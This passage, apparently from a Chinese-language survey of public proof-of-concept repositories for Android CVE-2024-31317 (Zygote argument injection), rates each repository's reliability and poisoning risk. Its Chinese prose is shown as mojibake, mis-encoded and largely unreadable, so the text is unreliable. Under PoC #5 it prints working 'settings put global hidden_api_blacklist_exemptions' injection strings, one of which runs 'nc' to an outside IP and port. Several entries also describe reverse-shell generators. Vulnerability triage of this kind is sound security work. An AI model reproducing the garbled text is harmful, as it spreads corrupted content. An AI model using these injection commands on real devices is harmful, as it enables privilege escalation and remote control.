ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å­˜åœ¨ï¼Œä½†ä¸»è¦é£é™©é›†ä¸­åœ¨åå‘shellçš„åŠŸèƒ½ä¸Šï¼Œä»¥åŠè„šæœ¬ä½œè€…å¯èƒ½æ¤å…¥çš„æ½œåœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ä½œè€…å£°æ˜çš„MITå¼€æºåè®®ä»¥åŠä»£ç ä¸­æ˜æ˜¾çš„åŠŸèƒ½å®ç°ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [JadeByteZen/CVE-2024-31317-PoC-Deployer](https://github.com/JadeByteZen/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #3

**æ¥æº**: [CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ç‰¹æƒæå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ä»»æ„åº”ç”¨ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™å’Œç”¨æˆ·æ‰§è¡Œæƒé™ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-31317æ˜¯Androidç³»ç»Ÿä¸­çš„ä¸€ä¸ªç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äº`ZygoteProcess.java`çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™åœ¨ä»»ä½•åº”ç”¨ä¸­æ‰§è¡Œä»£ç ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œåˆ©ç”¨æ­¤æ¼æ´æ— éœ€ç”¨æˆ·äº¤äº’ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´åœ¨Zygoteè¿›ç¨‹ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œè¿›è€Œæ§åˆ¶æ–°åˆ›å»ºçš„åº”ç”¨è¿›ç¨‹ã€‚æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ›´åƒä¸€ä¸ªåå‘shellçš„ç”Ÿæˆè„šæœ¬ï¼Œæœ¬èº«ä¸ç›´æ¥åŒ…å«æ¼æ´åˆ©ç”¨ä»£ç ï¼Œä½†è„šæœ¬ç”Ÿæˆçš„åå‘shellå¯ä»¥é€šè¿‡æ¼æ´åˆ©ç”¨payloadæ‰§è¡Œï¼Œé—´æ¥å®Œæˆæ¼æ´åˆ©ç”¨è¿‡ç¨‹ã€‚ æŠ•æ¯’é£é™©è¯„ä¼°ä¸º5%ï¼Œä¸»è¦æ˜¯å› ä¸ºè„šæœ¬æœ¬èº«ä¼šä»å¤–éƒ¨å¯¼å…¥payloadï¼Œå­˜åœ¨payloadè¢«æ›¿æ¢çš„é£é™©ï¼Œä¸”è„šæœ¬ä½œè€…å£°æ˜äº†å…è´£æ¡æ¬¾ï¼Œæš—ç¤ºå­˜åœ¨ä¸€å®šé£é™©ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œæ¼æ´æ˜¯ç”±äº`ZygoteProcess.java`ä¸­å­˜åœ¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–é€ æˆçš„ï¼Œé€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„åº”ç”¨çš„ä»£ç ã€‚æä¾›çš„è„šæœ¬åˆ›å»ºäº†ä¸€ä¸ªåå‘shellï¼Œè¯¥åå‘shelléœ€è¦è¢«æ³¨å…¥åˆ°åˆ©ç”¨é“¾ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–`WRITE_SECURE_SETTINGS`æƒé™ï¼š** æ”»å‡»è€…éœ€è¦é¦–å…ˆè·å–`WRITE_SECURE_SETTINGS`æƒé™ã€‚è¿™å¯ä»¥é€šè¿‡å·²æœ‰çš„æ¼æ´ã€æƒé™æå‡æˆ–è€…æ¶æ„åº”ç”¨æ¥å®ç°ã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š**  åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€ æ¶æ„çš„payloadï¼Œè¯¥payloadä¼šæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œä¾‹å¦‚ï¼Œå¯åŠ¨ä¸€ä¸ªåå‘shellã€‚
3.  **åˆ©ç”¨Zygoteè¿›ç¨‹ï¼š**  é€šè¿‡æŸç§æ–¹å¼è§¦å‘Zygoteè¿›ç¨‹æ‰§è¡ŒåŒ…å«æ¶æ„payloadçš„ååºåˆ—åŒ–æ“ä½œã€‚
4.  **ä»£ç æ‰§è¡Œï¼š**  å½“Zygoteè¿›ç¨‹ååºåˆ—åŒ–æ¶æ„æ•°æ®æ—¶ï¼Œæ”»å‡»è€…çš„ä»£ç å°†åœ¨ç›®æ ‡åº”ç”¨è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°æƒé™æå‡ã€‚
5.  **åå‘Shellè¿æ¥:** æ”»å‡»è€…é€šè¿‡é¢„è®¾çš„IPå’Œç«¯å£æ¥æ”¶åå‘shellï¼Œä»è€Œæ§åˆ¶è®¾å¤‡

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„è„šæœ¬ä¸»è¦ç”¨äºç”Ÿæˆåå‘shellç›¸å…³çš„ä»£ç ï¼Œæœ¬èº«çœ‹èµ·æ¥æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚ä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **Payloadçš„æ½œåœ¨é£é™©ï¼š** è¯¥è„šæœ¬ä¾èµ–äºå¤–éƒ¨æä¾›çš„payloadã€‚å¦‚æœpayloadè¢«æ›¿æ¢ä¸ºæ¶æ„ä»£ç ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´ä¸¥é‡çš„åæœã€‚
*   **åå‘Shellé£é™©ï¼š** åå‘shellæœ¬èº«å…·æœ‰é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºéæ³•ç›®çš„ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®ã€è¿œç¨‹æ§åˆ¶è®¾å¤‡ç­‰ã€‚
*   **è„šæœ¬ä½œè€…çš„å…è´£å£°æ˜:** è„šæœ¬ä½œè€…å£°æ˜äº†å…è´£æ¡æ¬¾ï¼Œæš—ç¤ºå­˜åœ¨ä¸€å®šé£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼Œè¯¥POCè„šæœ¬å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†é£é™©è¾ƒä½ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„å®‰å…¨æ€§ä»¥åŠè„šæœ¬æœ¬èº«å¯èƒ½è¢«æ»¥ç”¨ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [Webldix/CVE-2024-31317-PoC-Deployer](https://github.com/Webldix/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #4

**æ¥æº**: [CVE-2024-31317-agg23_cve-2024-31317.md](../2024/CVE-2024-31317-agg23_cve-2024-31317.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ç‰¹æƒæå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå’Œæƒé™æå‡

**å½±å“ç‰ˆæœ¬:** 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™å’Œç”¨æˆ·æ‰§è¡Œæƒé™

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 æ˜¯ä¸€ä¸ª Android ç³»ç»Ÿä¸­çš„ç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ‹¥æœ‰ `WRITE_SECURE_SETTINGS` æƒé™çš„åº”ç”¨æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ¨¡æ‹Ÿä»»ä½•å…¶ä»–åº”ç”¨ç¨‹åºçš„èº«ä»½ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´è¢«è®¤ä¸ºæ˜¯ Android ç”¨æˆ·æ€ä¸­æœ€æœ‰ä»·å€¼çš„æ¼æ´ä¹‹ä¸€ã€‚å¤šä¸ªæ¥æºï¼ˆå¦‚Metaå®‰å…¨åšå®¢ã€dawnslabã€flanker017åšå®¢ï¼‰éƒ½æä¾›äº†æ¼æ´åˆ†æå’Œåˆ©ç”¨æ–¹æ³•ï¼Œè¡¨æ˜è¯¥æ¼æ´çš„PoCæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ PoC ä»£ç ä¸»è¦åŒ…å«æ¼æ´çš„è§£é‡Šã€Zygote å‚æ•°è¯´æ˜ä»¥åŠæ¨¡æ‹Ÿå™¨è®¾ç½®æŒ‡å—ï¼Œå¹¶æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä½†è€ƒè™‘åˆ°ä»£ç ä¸­å¯èƒ½å­˜åœ¨éšè—çš„åé—¨æˆ–æœªå…¬å¼€çš„åˆ©ç”¨æ–¹å¼ï¼Œä¾‹å¦‚å¯¹ç³»ç»Ÿå±æ€§çš„æ¶æ„ä¿®æ”¹ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚é£é™©è¯„ä¼°ä¸º10%ï¼Œé£é™©è¾ƒä½ä½†ä¸å¯å¿½è§†ã€‚ä¸»è¦é£é™©ç‚¹åœ¨äºåˆ©ç”¨`system`æƒé™æ‰§è¡ŒæœªçŸ¥çš„æ“ä½œï¼Œå¯èƒ½å­˜åœ¨éšè”½çš„æ¶æ„è¡Œä¸ºã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ©ç”¨å…·æœ‰ `WRITE_SECURE_SETTINGS` æƒé™çš„åº”ç”¨ç¨‹åºã€‚
2.  é€šè¿‡æ„é€ ç‰¹å®šçš„ Zygote å¯åŠ¨å‚æ•°ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ã€‚
3.  ä½¿ Zygote è¿›ç¨‹ä»¥ç›®æ ‡åº”ç”¨ç¨‹åºçš„ UID å’Œ SELinux ä¸Šä¸‹æ–‡å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚
4.  åœ¨æ–°è¿›ç¨‹ä¸­æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä»è€Œè·å¾—ç›®æ ‡åº”ç”¨ç¨‹åºçš„æƒé™ã€‚æ¯”å¦‚åˆ©ç”¨`shell`æƒé™å¯ä»¥æ‰§è¡Œadb shellå‘½ä»¤ï¼Œåˆ©ç”¨`system`æƒé™å¯ä»¥ä¿®æ”¹ç³»ç»Ÿå±æ€§ã€‚

æ€»è€Œè¨€ä¹‹ï¼Œæ¼æ´åˆ©ç”¨ä¾èµ–äºå¯¹ Zygote å¯åŠ¨å‚æ•°çš„ç²¾ç¡®æ„é€ ä»¥åŠç›®æ ‡ Android ç‰ˆæœ¬çš„ç‰¹æ€§ã€‚

**é¡¹ç›®åœ°å€:** [agg23/cve-2024-31317](https://github.com/agg23/cve-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #5

**æ¥æº**: [CVE-2024-31317-fuhei_CVE-2024-31317.md](../2024/CVE-2024-31317-fuhei_CVE-2024-31317.md)

## CVE-2024-31317 - Android Zygote Deserialization/Command Injection

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** æƒé™æå‡ (Elevation of Privilege)

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®ç°æœ¬åœ°æƒé™æå‡ï¼Œä»¥ä»»æ„åº”ç”¨èº«ä»½æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ `WRITE_SECURE_SETTINGS` æƒé™ã€‚é€šå¸¸å¯é€šè¿‡ ADB æˆ–å…¶ä»–æ¼æ´è·å–ã€‚ä½ç‰ˆæœ¬Androidå¯ä»¥ç›´æ¥é€šè¿‡å‘½ä»¤æ³¨å…¥ï¼Œé«˜ç‰ˆæœ¬éœ€è¦Bypassæ–¹æ¡ˆã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 å…è®¸æ”»å‡»è€…åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æˆ–å‘½ä»¤æ³¨å…¥ï¼Œåœ¨ Zygote è¿›ç¨‹ä¸­ä»¥ä»»æ„åº”ç”¨èº«ä»½æ‰§è¡Œä»£ç ã€‚è¯¥æ¼æ´å­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ `WRITE_SECURE_SETTINGS` æƒé™è®¾ç½®æ¶æ„çš„ `hidden_api_blacklist_exemptions` å€¼ï¼Œä»è€Œæ³¨å…¥æ¶æ„å‚æ•°ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– `WRITE_SECURE_SETTINGS` æƒé™ï¼š** è¿™æ˜¯åˆ©ç”¨è¯¥æ¼æ´çš„å‰ææ¡ä»¶ã€‚å¯ä»¥é€šè¿‡ ADB (å¦‚æœè®¾å¤‡å·²å¯ç”¨ USB è°ƒè¯•) æˆ–åˆ©ç”¨å…¶ä»–æ¼æ´æ¥è·å–æ­¤æƒé™ã€‚
2.  **æ„é€ æ¶æ„ `hidden_api_blacklist_exemptions` å€¼ï¼š** æ”»å‡»è€…éœ€è¦æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨ `settings put global hidden_api_blacklist_exemptions` å‘½ä»¤å°†å…¶å†™å…¥ç³»ç»Ÿè®¾ç½®ã€‚
3.  **è§¦å‘ Zygote è¿›ç¨‹ï¼š**  å†™å…¥è®¾ç½®åï¼Œå½“ç³»ç»Ÿå°è¯•ä½¿ç”¨è¢«ç¯¡æ”¹çš„ `hidden_api_blacklist_exemptions` æ—¶ï¼ŒZygote è¿›ç¨‹ä¼šæ‰§è¡Œæ³¨å…¥çš„æ¶æ„å‘½ä»¤ã€‚

**ä½ç‰ˆæœ¬ (Android 11 åŠä»¥ä¸‹) åˆ©ç”¨ï¼š**
å¯ä»¥ç›´æ¥é€šè¿‡æ¢è¡Œç¬¦è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n8\n--runtime-args\n--setuid=1000\n--setgid=1000\n--nice-name=com.android.settings\n--app-data-dir=/data/user/0/com.android.settings\n--package-name=com.android.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\nandroid.app.ActivityThread"
```
å¯ä»¥ä½¿ç”¨`invoke-with`å‚æ•°æ‰§è¡Œå‘½ä»¤ï¼Œä½†éœ€è¦å¼€å¯ debug æ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡`runtime-flags`å‚æ•°è®¾ç½®æ‰€æœ‰debugå±æ€§ã€‚
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n7\n--runtime-args\n--setuid=1000\n--setgid=1000\n--runtime-flags=43267\n--invoke-with\nnc 192.168.0.112 9981;\n--seinfo=platform:system_app:targetSdkVersion=29:complete"
```

**é«˜ç‰ˆæœ¬ (Android 12 åŠä»¥ä¸Š) åˆ©ç”¨ï¼š**
ç”±äº Google åœ¨ Android 12 ä¸­å¼•å…¥äº† C++ å‘½ä»¤è§£æå™¨ï¼Œç®€å•çš„å‘½ä»¤æ³¨å…¥ä¸å†æœ‰æ•ˆã€‚éœ€è¦ä½¿ç”¨æ›´å¤æ‚çš„ç»•è¿‡æ–¹æ³•ï¼Œä¾‹å¦‚ï¼Œåœ¨æ³¨å…¥çš„æ¶æ„å‘½ä»¤ä¹‹å‰å¡«å……å¤§é‡é€—å·ä»¥å¢åŠ æ—¶é—´é—´éš”ï¼Œä»è€Œç»•è¿‡ `NativeCommandBuffer` çš„é™åˆ¶ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’Œåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ PoC ä»£ç åº”è¯¥æ˜¯æœ‰æ•ˆçš„ã€‚å¤šä¸ªæœç´¢å¼•æ“ç»“æœéƒ½æåˆ°äº†è¯¥æ¼æ´çš„åˆ©ç”¨ï¼Œå¹¶æä¾›äº†ç›¸å…³çš„åˆ†æå’Œå‚è€ƒé“¾æ¥ã€‚æä¾›çš„åˆ©ç”¨ä»£ç ä¹ŸåŒ…å«äº†ä½ç‰ˆæœ¬å’Œé«˜ç‰ˆæœ¬çš„åˆ©ç”¨æ–¹æ³•ï¼Œå¹¶ç»™å‡ºäº†è¯¦ç»†çš„æ­¥éª¤å’Œç¤ºä¾‹ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**
è¯¥ä»“åº“ä¸»è¦åŒ…å«æ¼æ´åˆ©ç”¨çš„è¯´æ˜æ–‡æ¡£å’Œä¸€äº›æ„å»ºæ–‡ä»¶ã€‚è™½ç„¶æ— æ³•å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½æ€§ï¼Œä½†ä»ç›®å‰çš„ä»£ç æ¥çœ‹ï¼Œé£é™©è¾ƒä½ã€‚é£é™©ç‚¹å¯èƒ½å­˜åœ¨äºåˆ©ç”¨è„šæœ¬ä¸­ï¼Œä¾‹å¦‚æ‰§è¡Œ nc å‘½ä»¤ï¼Œè™½ç„¶æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç½‘ç»œå·¥å…·ï¼Œä½†æ˜¯å­˜åœ¨è¢«åˆ©ç”¨çš„é£é™©ï¼Œä¾‹å¦‚è¿æ¥åˆ°æ¶æ„çš„æœåŠ¡å™¨ã€‚gradleæ–‡ä»¶é£é™©è¾ƒå°ï¼Œä¸»è¦æ˜¯æ„å»ºé…ç½®ï¼Œä½†ç†è®ºä¸Šå­˜åœ¨è¿œç¨‹ä¾èµ–å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [fuhei/CVE-2024-31317](https://github.com/fuhei/CVE-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #6

**æ¥æº**: [CVE-2024-31317-jmywh1_CVE-2024-31317.md](../2024/CVE-2024-31317-jmywh1_CVE-2024-31317.md)

## CVE-2024-31317-Android-Zygoteååºåˆ—åŒ–æ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ååºåˆ—åŒ–æ¼æ´

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä»»æ„åº”ç”¨ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`android.permission.WRITE_SECURE_SETTINGS`æƒé™ï¼Œç”¨æˆ·äº¤äº’ä¸æ˜¯å¿…é¡»çš„

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317æ˜¯ä¸€ä¸ªAndroidç³»ç»Ÿä¸­çš„ç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äºZygoteProcess.javaçš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ‹¥æœ‰`WRITE_SECURE_SETTINGS`æƒé™çš„åº”ç”¨ç¨‹åºï¼Œä»¥ä»»ä½•åº”ç”¨ç¨‹åºçš„èº«ä»½æ‰§è¡Œä»£ç ï¼Œå¯¼è‡´æœ¬åœ°ææƒã€‚æ ¹æ®NVDçš„æè¿°ï¼Œè¯¥æ¼æ´çš„CVSS 3.1è¯„åˆ†ä¸º7.8ï¼Œå±äºé«˜å±æ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…åˆ©ç”¨`WRITE_SECURE_SETTINGS`æƒé™ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œä¼ é€’ç»™Zygoteè¿›ç¨‹å¤„ç†ã€‚Zygoteè¿›ç¨‹åœ¨ååºåˆ—åŒ–è¿™äº›æ•°æ®æ—¶ï¼Œç”±äºç¼ºä¹è¶³å¤Ÿçš„å®‰å…¨æ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œæå‡æƒé™åˆ°å…¶ä»–åº”ç”¨ã€‚

**POCä»£ç åˆ†æï¼š**
æä¾›çš„POCä»£ç åŒ…å«`build.gradle`ã€`gradle.properties`å’Œ`gradlew`æ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªæ ‡å‡†çš„Android Gradleé¡¹ç›®çš„åŸºæœ¬æ–‡ä»¶ã€‚å®ƒä»¬ä¸»è¦ç”¨äºæ„å»ºAndroidåº”ç”¨ç¨‹åºï¼Œæœ¬èº«ä¸åŒ…å«ç›´æ¥åˆ©ç”¨CVE-2024-31317æ¼æ´çš„ä»£ç ã€‚è¿™ä¸ªåº“æœ¬èº«åªæ˜¯å®‰å“é¡¹ç›®gradleæ„å»ºæ–‡ä»¶ï¼Œè¦åˆ©ç”¨æ¼æ´è¿˜éœ€è¦æ›´å¤šä¿¡æ¯ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**
è™½ç„¶æä¾›çš„ä»£ç ç‰‡æ®µæœ¬èº«ä¸ç›´æ¥æ„æˆæ¼æ´åˆ©ç”¨ï¼Œä½†ä½œä¸ºä¸€ä¸ªAndroidé¡¹ç›®ï¼Œå®ƒå¯ä»¥è¢«ç”¨æ¥æ„å»ºåŒ…å«æ¼æ´åˆ©ç”¨ä»£ç çš„æ¶æ„åº”ç”¨ã€‚`gradlew`è„šæœ¬å¯èƒ½è¢«ä¿®æ”¹ä¸ºåŒ…å«ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„ä»£ç çš„æ­¥éª¤ï¼Œæˆ–è€…`build.gradle`æ–‡ä»¶å¯èƒ½è¢«ä¿®æ”¹ä¸ºå¼•å…¥åŒ…å«æ¶æ„ä»£ç çš„ä¾èµ–é¡¹ã€‚è€ƒè™‘åˆ°è¿™ç§å¯èƒ½æ€§ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º10%ã€‚è¿™ä¸ªæ¦‚ç‡ä¸»è¦æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨æ„å»ºè¿‡ç¨‹ä¸­æ·»åŠ æ¶æ„ä¾èµ–æˆ–è€…æ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œä½†æ˜¯ä»ç›®å‰çš„ä»£ç æ¥çœ‹ï¼Œå¹¶æ²¡æœ‰ç›´æ¥çš„è¯æ®è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [jmywh1/CVE-2024-31317](https://github.com/jmywh1/CVE-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #7

**æ¥æº**: [CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317 Android ZygoteProcess ååºåˆ—åŒ–æ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ååºåˆ—åŒ–æ¼æ´å¯¼è‡´ææƒ

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœ¬åœ°ææƒåˆ°ä»»æ„åº”ç”¨æƒé™

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦Useræ‰§è¡Œæƒé™ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’ï¼Œéœ€è¦WRITE_SECURE_SETTINGSæƒé™ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 70%

## è¯¦æƒ…

CVE-2024-31317 æ˜¯ä¸€ä¸ª Android æ“ä½œç³»ç»Ÿä¸­çš„æƒé™æå‡æ¼æ´ï¼Œå­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ `WRITE_SECURE_SETTINGS` æƒé™æ‰§è¡Œä»»æ„åº”ç”¨ç¨‹åºçš„ä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´æœ¬åœ°æƒé™æå‡ã€‚ä»æœç´¢å¼•æ“ç»“æœæ¥çœ‹ï¼Œè¿™ä¸ªæ¼æ´è¢«è®¤ä¸ºæ˜¯è¿‘å¹´æ¥æœ€æœ‰ä»·å€¼çš„Androidç”¨æˆ·ç©ºé—´æ¼æ´ä¹‹ä¸€ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„åˆ©ç”¨æ–¹æ³•ã€‚æ¼æ´åˆ©ç”¨ä»£ç  `Android_Zygote_Research_Kit.sh` è„šæœ¬æ—¨åœ¨å¸®åŠ©ç ”ç©¶äººå‘˜å¤ç°å’Œåˆ†ææ­¤æ¼æ´ã€‚å®ƒåŒ…å«ä¸€ä¸ªåå‘ shell ç¨‹åºï¼ˆ`reverse_shell.c`ï¼‰ï¼Œä¸€ä¸ª payload æ–‡ä»¶ï¼ˆ`payload.txt`ï¼‰ï¼Œä¸€ä¸ªç¼–è¯‘è„šæœ¬ï¼ˆ`compile.sh`ï¼‰ï¼Œä»¥åŠç›¸å…³çš„è¯´æ˜æ–‡æ¡£ã€‚è„šæœ¬å°è¯•åˆ›å»ºä¸€ä¸ªç›‘å¬ç‰¹å®šç«¯å£çš„åå‘ shellï¼Œè¿™æœ¬èº«å°±å­˜åœ¨ä¸€å®šçš„é£é™©ã€‚è„šæœ¬ä¸­åå‘è¿æ¥çš„ç¡¬ç¼–ç ç«¯å£å’ŒIPåœ°å€ï¼Œæ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ§åˆ¶å—å®³è®¾å¤‡çš„åå‘è¿æ¥ã€‚è€ƒè™‘åˆ°è„šæœ¬çš„ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿ç ”ç©¶äººå‘˜ä½¿ç”¨ï¼Œå­˜åœ¨ä¸€ç§æŠ•æ¯’é£é™©ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹åå‘ shell çš„ä»£ç ï¼Œåœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ¤å…¥æ¶æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä¿®æ”¹ `reverse_shell.c` 